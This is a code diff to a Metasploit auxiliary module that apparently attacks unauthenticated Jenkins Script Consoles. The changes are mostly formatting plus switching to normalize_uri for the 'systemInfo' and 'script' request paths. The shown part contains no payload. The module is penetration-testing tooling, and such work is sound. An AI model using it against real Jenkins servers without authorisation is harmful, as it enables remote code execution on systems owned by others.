@@ -22,12 +22,13 @@ class Metasploit3 < Msf::Auxiliary
       },
       'Author'      =>
         [
-             'altonjx',
-             'Jeffrey Cap'
+          'altonjx',
+          'Jeffrey Cap'
         ],
-      'References'  => [
-        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
-        ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console'],
+      'References'  =>
+        [
+          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
+          ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console'],
         ],
       'License'     => MSF_LICENSE
       ))
@@ -40,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def fingerprint_os(ip)
-    res = send_request_cgi({'uri' => "#{target_uri.path}systemInfo"})
+    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,"systemInfo")})
 
     # Verify that we received a proper systemInfo response
     unless res && res.body.to_s.length > 0
@@ -80,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
     prefix = host_info[:prefix]
 
     request_parameters = {
-      'uri'       => "#{target_uri.path}script",
+      'uri'       => normalize_uri(target_uri.path,"script"),
       'method'    => 'POST',
       'ctype'     => 'application/x-www-form-urlencoded',
       'vars_post' =>
